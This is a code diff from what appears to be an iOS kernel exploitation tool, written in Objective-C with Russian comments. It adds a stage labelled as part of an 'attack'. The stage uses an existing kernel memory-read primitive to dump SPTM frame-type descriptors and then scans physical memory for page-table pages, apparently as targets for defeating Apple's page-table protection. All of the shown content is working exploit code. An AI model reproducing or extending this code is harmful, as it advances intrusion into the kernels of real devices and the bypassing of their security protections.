@@ -2827,7 +2827,56 @@ static NSString *kpFmtSptmFn(uint64_t raw)
         }
     }
 
-    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501] выше\n"];
+    // ---- SPTM RE 2.0.72: frame-type descriptors + PTE hunt (read-only) ----
+    [r appendString:@"=== SPTM RE 2.0.72 ===\n"];
+    {
+        uint64_t ftp = ksymbol(libsptm_frame_type_params);
+        kpNote(r, [NSString stringWithFormat:@"  [SPTM] libsptm_frame_type_params=%#llx", (unsigned long long)ftp]);
+        if (ftp) {
+            uint64_t base = kp_untag_ptr(early_kread64(ftp));
+            kpNote(r, [NSString stringWithFormat:@"  [SPTM] desc table VA=%#llx", (unsigned long long)base]);
+            // 12 записей по 0x60 — смотрим in/out fn и flags
+            for (int i = 0; i < 16; i++) {
+                uint64_t e = base + (uint64_t)i * 0x60;
+                uint64_t q0 = early_kread64(e);
+                uint64_t q1 = early_kread64(e + 8);
+                uint64_t q3 = early_kread64(e + 0x18);
+                uint64_t q4 = early_kread64(e + 0x20);
+                uint64_t q6 = early_kread64(e + 0x30);
+                if (!q0 && !q1 && !q4) break;
+                kpNote(r, [NSString stringWithFormat:@"  [SPTM] type[0x%x]: in=%#llx fn1=%#llx fl=%#llx fn2=%#llx out=%#llx",
+                          i, (unsigned long long)q0, (unsigned long long)q1,
+                          (unsigned long long)q3, (unsigned long long)q4, (unsigned long long)q6]);
+            }
+        }
+        // PTE-hunt: ищем L3-таблицы, которые сами лежат на 0x21 (а не 0x15)
+        uint64_t wB = kconstant(physBase), wS = kconstant(physSize);
+        uint32_t n15 = 0, n21pte = 0;
+        for (uint64_t pa = wB; pa < wB + wS; pa += 0x4000) {
+            int t = kpFrameTypeOf(pa);
+            if (t == 0x15) n15++;
+            if (t == 0x21) {
+                // эвристика PTE: страница, полная ссылок на PA с флагами 0x43/0x47
+                uint64_t al = phystokv(pa);
+                if (!al) continue;
+                int good = 0, total = 0;
+                for (uint32_t o = 0; o < 0x80; o += 8) {
+                    uint64_t q = early_kread64(al + o);
+                    if ((q & 3) == 3) { good++; }
+                    total++;
+                }
+                if (good >= 8 && total) {
+                    n21pte++;
+                    if (n21pte <= 5)
+                        kpNote(r, [NSString stringWithFormat:@"  [SPTM] ★ 0x21-page looks like PTE: pa=%#llx va=%#llx (%d/%d valid)",
+                                  (unsigned long long)pa, (unsigned long long)al, good, total]);
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [SPTM] frames type15=%u type21-pte-like=%u", n15, n21pte]);
+    }
+
+    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM] выше\n"];
     return r;
 
 }
